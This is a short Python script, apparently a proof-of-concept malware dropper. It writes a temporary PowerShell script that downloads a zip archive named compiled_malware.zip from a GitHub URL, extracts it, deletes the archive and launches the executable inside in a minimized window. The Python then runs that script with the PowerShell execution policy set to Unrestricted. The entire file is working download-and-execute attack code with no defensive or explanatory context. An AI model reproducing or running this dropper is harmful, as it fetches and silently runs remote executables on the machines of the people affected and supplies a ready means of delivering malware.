import os
import subprocess
import tempfile
import uuid

t = f'{tempfile.gettempdir()}/{uuid.uuid4().hex}.ps1'
malware_url = "https://github.com/guibacellar/downloadable_pocs/raw/main/pre_compiled_assets/compiled_malware.zip"

with open(t, 'w') as fs:
    fs.write(
        f'''
# powershell -ExecutionPolicy Unrestricted -File dropper_ps_script.ps1
Add-Type -Assembly "System.IO.Compression.FileSystem";

$tempFolderPath = Join-Path $Env:Temp $(New-Guid)

$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("{malware_url}","malware.zip")
[System.IO.Compression.ZipFile]::ExtractToDirectory("malware.zip", $tempFolderPath);
Remove-Item "malware.zip"
Start-Process -FilePath "$tempFolderPath/malware_main.exe" -WindowStyle Minimized
        '''
    )
    fs.flush()
    os.fsync(fs.fileno())
    fs.close()


subprocess.run(["powershell", "-ExecutionPolicy", "Unrestricted", "-File", f"{t}"])
